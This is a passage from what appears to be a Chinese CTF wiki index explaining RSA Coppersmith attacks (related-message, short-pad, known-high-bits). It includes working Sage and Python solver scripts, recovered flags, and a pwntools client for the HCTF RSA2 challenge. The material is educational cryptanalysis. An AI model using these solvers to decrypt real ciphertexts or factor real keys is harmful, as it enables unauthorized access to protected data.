<p>\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b e=3\uff0c\u4e14 f(x)=ax+b \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709</p>  C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N  <p>\u90a3\u4e48\u6211\u4eec\u6709</p>  C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N  <p>\u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1</p>  (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3  <p>\u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2</p>  (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N  <p>\u6839\u636e\u5f0f 1 \u6211\u4eec\u6709</p>  a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N  <p>\u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3</p>  3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N  <p>\u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97</p>  (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N  <p>\u8fdb\u800c\u6211\u4eec\u6709</p>  aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3}  <p>\u8fdb\u800c</p>  aM_2\\equiv  \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3}  <p>\u8fdb\u800c</p>  M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}  <p>\u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002</p> <p>\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb A New Related Message Attack on RSA \u4ee5\u53ca paper \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3","title":"SCTF RSA3","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b</p> <pre><code>import gmpy2\nid1 = 1002\nid2 = 2614\n\nc1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L\nc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L\nn = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\na = 1\nb = id1 - id2\n\n\ndef getmessage(a, b, c1, c2, n):\n    b3 = gmpy2.powmod(b, 3, n)\n    part1 = b * (c1 + 2 * c2 - b3) % n\n    part2 = a * (c1 - c2 + 2 * b3) % n\n    part2 = gmpy2.invert(part2, n)\n    return part1 * part2 % n\n\n\nmessage = getmessage(a, b, c1, c2, n) - id2\nmessage = hex(message)[2:]\nif len(message) % 2 != 0:\n    message = '0' + message\n\nprint message.decode('hex')\n</code></pre> <p>\u5f97\u5230\u660e\u6587</p> <pre><code>\u279c  sctf-rsa3-level3 git:(master) \u2717 python exp.py\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n</code></pre> <p>\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002</p> <pre><code>import binascii\n\ndef attack(c1, c2, b, e, n):\n    PR.&lt;x&gt;=PolynomialRing(Zmod(n))\n    g1 = x^e - c1\n    g2 = (x+b)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nc1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L\nc2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L\nn = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553\ne=3\na = 1\nid1 = 1002\nid2 = 2614\nb = id2 - id1\nm1 = attack(c1,c2, b,e,n)\nprint binascii.unhexlify(\"%x\" % int(m1 - id1))\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  sctf-rsa3-level3 git:(master) \u2717 sage exp.sage\nsys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it.\nUntrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory\nF4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_8","title":"\u9898\u76ee","text":"<ul> <li>hitcon 2014 rsaha</li> <li>N1CTF 2018 rsa_padding</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmiths-short-pad-attack","title":"Coppersmith\u2019s short-pad attack","text":"<p>\u77ed\u5b57\u8282\u586b\u5145\u653b\u51fb\uff0c\u5176\u4e2d\u8981\u7528\u5230 Coppersmith \u548c Franklin-Reiter\u76f8\u5173\u6d88\u606f\u653b\u51fb</p> <p>\u573a\u666f\u5982\u4e0b\uff1a</p> <p>\u5df2\u77e5\u516c\u94a5 (n, e)\uff0c\u660e\u6587\u4e3aM\uff0c\u5728\u660e\u6587M\u7684\u672b\u5c3e\u586b\u5145\u968f\u673a\u5b57\u8282\uff0c\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u662f</p> <pre><code>import os\nfrom gmpy2 import *\n\nm1 = bytes_to_long(M + os.urandom(8))\nm2 = bytes_to_long(M + os.urandom(8))\nc1 = powmod(m1, e, n)\nc2 = powmod(m2, e, n)\nprint(c1)\nprint(c2)\n</code></pre> <p>\u6570\u5b66\u8868\u8fbe\u5f0f\u4e3a</p>  m_1 = 2^mM+r_1\\\\ m_2 = 2^mM+r_2"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_9","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u5df2\u77e5\u7528\u76f8\u540c\u7684\u516c\u94a5\u52a0\u5bc6\u7684\u5bc6\u6587 c1, c2 \uff0c\u8bbe</p>  g_1(x, y) = x^e-c_1\\\\ g_2(x, y) = (x+y)^e-c_2  <p>\u8fd9\u91cc\u7684 g_1,g_2 \u90fd\u662f\u5b9a\u4e49\u5728\u6a21 n \u7684\u591a\u9879\u5f0f\u73af\u4e0a\u7684.</p> <p>\u5f53 x = m_1,y =  r_2-r_1 \u65f6\uff0c</p>  g_1 = m_1^e-c_1=0\\\\ g_2=(m_1+r_2-r_1)^e-c_2=m_2^e-c_2=0  <p>\u5373 g_1,g_2 \u6709\u516c\u5171\u7684\u6839 x=m_1.</p> <p>\u8bbe h(y) = res_x(g_1, g_2)\uff0c\u8fd9\u91cc\u7684 res_x \u8868\u793a\u591a\u9879\u5f0fg_1,g_2\u7684\u7ed3\u5f0f\uff08resultant\uff09.</p> <p>\u6211\u4eec\u7565\u8fc7\u5b83\u7684\u5b9a\u4e49\uff08\u53cd\u6b63\u5728sage\u4e2d\u53ef\u4ee5\u76f4\u63a5\u6c42\u5f97\uff09\uff0c\u5229\u7528\u7ed3\u5f0f\u7684\u6027\u8d28\uff1a\u591a\u9879\u5f0ff(x), g(x) \u6709\u516c\u5171\u6839\u7684\u5145\u8981\u6761\u4ef6\u662f\u7ed3\u5f0fR(f,g)=0.</p> <p>\u4ee4 h(y)=0\uff0c\u53ef\u4ee5\u7528 Coppersmith \u6c42\u89e3\u65b9\u7a0b\u5f97\u5230 y. </p> <p>\u6c42\u5f97 y \u540e\uff0c\u518d\u7528Franklin-Reiter\u76f8\u5173\u6d88\u606f\u653b\u51fb\u5373\u53ef.</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_10","title":"\u811a\u672c","text":"<pre><code># sage\n# output: y = r2 - r1\ndef short_pad_attack(c1, c2, e, n):\n    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))\n    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))\n    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))\n\n    g1 = x^e - c1\n    g2 = (x+y)^e - c2\n\n    q1 = g1.change_ring(PRZZ)\n    q2 = g2.change_ring(PRZZ)\n\n    h = q2.resultant(q1) # \u6c42\u7ed3\u5f0f R(q1, q2)\n    h = h.univariate_polynomial()\n    h = h.change_ring(PRx).subs(y=xn)\n    h = h.monic()\n\n    kbits = int(n).bit_length()//(2*e*e)\n\n    print(h)\n    print(kbits)\n    # \u8fd9\u91cc\u7684X\u53c2\u6570\u9700\u8981\u6839\u636e\u9898\u76ee\u6761\u4ef6\u8c03\u6574\n    diff = h.small_roots(X=2^64, beta=0.499999)\n    return diff\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#hitctf2020ezrsa","title":"\u4f8b\u9898 [HITCTF2020]eZRSA","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_11","title":"\u9898\u76ee","text":"<pre><code>#! /bin/bash python2\nfrom flag import flag\nfrom Crypto.Util.number import *\nimport os\n\nflag = flag+os.urandom(32)\n\np = getPrime(512)\nq = getPrime(512)\nn = p*q\ne = 3\nphi = (p-1)*(q-1)\nd = inverse(e,phi)\n\nm1 = bytes_to_long(flag)\nm2 = bytes_to_long(flag+os.urandom(8))\n\nassert pow(m1,3) &gt; n\n\nc1 = pow(m1,e,n)\nc2 = pow(m2,e,n)\n\nprint \"c1 = %d\"%c1\nprint \"c2 = %d\"%c2\nprint  \"n = %d\"%n\n\n'''\nc1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083\nc2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498\nn = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127\n'''\n</code></pre> <p>\u8fd9\u91cc\u9700\u8981\u8fdb\u884c\u4e00\u70b9\u53d8\u5f62\uff0c\u56e0\u4e3a</p> <pre><code>m1 = bytes_to_long(flag)\nm2 = bytes_to_long(flag+os.urandom(8))\n</code></pre> <p>\u8fd9\u548c</p>  m_1 = 2^mM+r_1\\\\ m_2 = 2^mM+r_2  <p>\u8fd8\u6709\u70b9\u533a\u522b\uff0c\u6b64\u65f6</p>  m_1=M\\\\ m_2=2^{64}M+r_2  <p>\u8fd9\u91cc\u7684M\u662f<code>flag = flag + os.urandom(8)</code></p> <p>\u53d8\u5f62\u7684\u65b9\u6cd5\u662f\u5c06<code>m1</code>\u5de6\u79fb64\u4f4d\uff0c\u5c06<code>r1</code>\u770b\u505a0\uff0c\u7ecf\u8fc7\u8fd9\u6837\u7684\u5904\u7406\u540e\uff0c</p>  newm_1=2^{64}M+0\\\\ m_2=2^{64}M+r  <p>\u8fd9\u91cc\u7684<code>r = r2 = gmpy2.s2n(os.urandom(8))</code></p> <p>\u518d\u7ecf\u8fc7\u52a0\u5bc6\uff0c</p>  \\begin{aligned} newc_1&amp;=newm_1^e\\mod n\\\\ &amp;=(2^{64}m_1)^e \\mod n\\\\ &amp;=2^{64e}c_1 \\mod n \\end{aligned}  <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>c1</code>\u6c42\u51fa<code>new_c1</code>\uff0c\u95ee\u9898\u5c31\u8f6c\u5316\u4e3a\u666e\u901a\u7684Short-Pad Attack\u4e86.</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#exp","title":"EXP","text":"<pre><code># sage\n# output: y = r2 - r1\ndef short_pad_attack(c1, c2, e, n):\n    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))\n    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))\n    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))\n\n    g1 = x^e - c1\n    g2 = (x+y)^e - c2\n\n    q1 = g1.change_ring(PRZZ)\n    q2 = g2.change_ring(PRZZ)\n\n    h = q2.resultant(q1) # \u6c42\u7ed3\u5f0f R(q1, q2)\n    h = h.univariate_polynomial()\n    h = h.change_ring(PRx).subs(y=xn)\n    h = h.monic()\n\n    kbits = int(n).bit_length()//(2*e*e)\n\n    print(h)\n    print(kbits)\n    # \u8fd9\u91cc\u7684X\u53c2\u6570\u9700\u8981\u6839\u636e\u9898\u76ee\u6761\u4ef6\u8c03\u6574\n    diff = h.small_roots(X=2^64, beta=0.499999)\n    return diff\n\nc1 = \nc2 = \ne = 3\nn = \nc1 = (c1 * 2^(64*e)) % n\nr = short_pad_attack(c1, c2, e, n)[0]\n\nF.&lt;x&gt; = PolynomialRing(Zmod(n))\nf = x^e - c1\ng = (x+r)^e - c2\n\ndef myGcd(x, y):\n    if y == 0:\n        return x.monic()\n    return myGcd(y, x%y)\n\ntmp = myGcd(f, g)\nm = tmp.coefficients()[0]\nm = F(m)\nprint(m)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack","title":"Known High Bits Message Attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_12","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b</p>  C\\equiv m^d \\bmod N  <p>\u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 m_0\uff0c\u5373 m=m_0+x\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 x\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 x \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002</p> <p>\u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#factoring-with-high-bits-known","title":"Factoring with High Bits Known","text":""},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_13","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_14","title":"\u653b\u51fb\u5de5\u5177","text":"<p>\u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks\u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801</p> <pre><code>beta = 0.5\ndd = f.degree()\nepsilon = beta / 7\nmm = ceil(beta**2 / (dd * epsilon))\ntt = floor(dd * mm * ((1/beta) - 1))\nXX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000\nroots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)\n</code></pre> <p>\u5176\u4e2d\uff0c</p> <ul> <li>\u5fc5\u987b\u6ee1\u8db3 q\\geq N^{beta}\uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86beta=0.5\uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002</li> <li>XX \u662f f(x)=q'+x \u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 q' \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#2016-hctf-rsa2","title":"2016 HCTF RSA2","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from pwn import *\nfrom hashlib import sha512\nsh = remote('127.0.0.1', 9999)\ncontext.log_level = 'debug'\ndef sha512_proof(prefix, verify):\n    i = 0\n    pading = \"\"\n    while True:\n        try:\n            i = randint(0, 1000)\n            pading += str(i)\n            if len(pading) &gt; 200:\n                pading = pading[200:]\n            #print pading\n        except StopIteration:\n            break\n        r = sha512(prefix + pading).hexdigest()\n        if verify in r:\n            return pading\n\n\ndef verify():\n    sh.recvuntil(\"Prefix: \")\n    prefix = sh.recvline()\n    print len(prefix)\n    prefix = prefix[:-1]\n    prefix = prefix.decode('base64')\n    proof = sha512_proof(prefix, \"fffffff\")\n    sh.send(proof.encode('base64'))\nif __name__ == '__main__':\n    verify()\n    print 'verify success'\n    sh.recvuntil(\"token: \")\n    token = \"5c9597f3c8245907ea71a89d9d39d08e\"\n    sh.sendline(token)\n\n    sh.recvuntil(\"n: \")\n    n = sh.readline().strip()\n    n = int(n[2:], 16)\n\n    sh.recvuntil(\"e: \")\n    e = sh.readline().strip()\n    e = int(e[2:], 16)\n\n    sh.recvuntil(\"e2: \")\n    e2 = sh.readline().strip()\n    e2 = int(e2[2:], 16)\n\n    sh.recvuntil(\"is: \")\n    enc_flag = sh.readline().strip()\n    enc_flag = int(enc_flag[2:-1], 16)\n    print \"n: \", hex(n)\n    print \"e: \", hex(e)\n    print \"e2: \", hex(e2)\n    print \"flag: \", hex(enc_flag)\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b</p> <pre><code>n:  0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f\ne:  0x10001\ne2:  0xf93b\nflag:  0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa</p> <pre><code>    p, q, e = gen_key()\n    n = p * q\n    phi_n = (p-1)*(q-1)\n    d = invmod(e, phi_n)\n    while True:\n        e2 = random.randint(0x1000, 0x10000)\n        if gcd(e2, phi_n) == 1:\n            break\n</code></pre> <p>\u6211\u4eec\u5f97\u5230\u7684 n=p \\times q\u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 <code>gen_key</code> \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b <code>gen_key</code> \u51fd\u6570</p> <pre><code>def gen_key():\n    while True:\n        p = getPrime(k/2)\n        if gcd(e, p-1) == 1:\n            break\n    q_t = getPrime(k/2)\n    n_t = p * q_t\n    t = get_bit(n_t, k/16, 1)\n    y = get_bit(n_t, 5*k/8, 0)\n    p4 = get_bit(p, 5*k/16, 1)\n    u = pi_b(p4, 1)\n    n = bytes_to_long(long_to_bytes(t) + long_to_bytes(u) + long_to_bytes(y))\n    q = n / p\n    if q % 2 == 0:\n        q += 1\n    while True:\n        if isPrime(q) and gcd(e, q-1) == 1:\n            break\n        m = getPrime(k/16) + 1\n        q ^= m\n    return (p, q, e)\n</code></pre> <p>\u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570</p>  k=2048 e=0x10001  <p>\u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 <code>gcd(2,p-1)=1</code>\u3002</p> <p>\u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 q_t\uff0c\u5e76\u4e14\u8ba1\u7b97 n_t=p \\times q_t\u3002</p> <p>\u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 <code>get_bit</code> \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b</p> <pre><code>def get_bit(number, n_bit, dire):\n'''\n    dire:\n        1: left\n        0: right\n    '''\n\n    if dire:\n        sn = size(number)\n        if sn % 8 != 0:\n            sn += (8 - sn % 8)\n        return number &gt;&gt; (sn-n_bit)\n    else:\n        return number &amp; (pow(2, n_bit) - 1)\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u6839\u636e <code>dire(ction)</code> \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570</p> <ul> <li><code>dire=1</code> \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 <code>number</code> \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 <code>sn</code>\uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 <code>sn</code> \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de <code>number</code> \u53f3\u79fb <code>sn-n_bit</code> \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 <code>number</code> \u7684 <code>n_bit</code> \u4f4d\u3002</li> <li><code>dire=0</code> \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 <code>number</code> \u7684\u4f4e <code>n_bit</code> \u4f4d\u3002</li> </ul> <p>\u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f</p> <pre><code>    t = get_bit(n_t, k/16, 1)\n    y = get_bit(n_t, 5*k/8, 0)\n    p4 = get_bit(p, 5*k/16, 1)\n</code></pre> <p>\u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5</p> <ul> <li><code>t</code> \u4e3a <code>n_t</code> \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002</li> <li><code>y</code> \u4e3a <code>n_t</code> \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002</li> <li><code>p4</code> \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002</li> </ul> <p>\u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c</p> <pre><code>    u = pi_b(p4, 1)\n</code></pre> <p>\u5229\u7528 <code>pi_b</code> \u5bf9 <code>p4</code> \u8fdb\u884c\u4e86\u52a0\u5bc6</p> <pre><code>def pi_b(x, m):\n'''\n    m:\n        1: encrypt\n        0: decrypt\n    '''\n    enc = DES.new(key)\n    if m:\n        method = enc.encrypt\n    else:\n        method = enc.decrypt\n    s = long_to_bytes(x)\n    sp = [s[a:a+8] for a in xrange(0, len(s), 8)]\n    r = \"\"\n    for a in sp:\n        r += method(a)\n    return bytes_to_long(r)\n</code></pre> <p>\u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 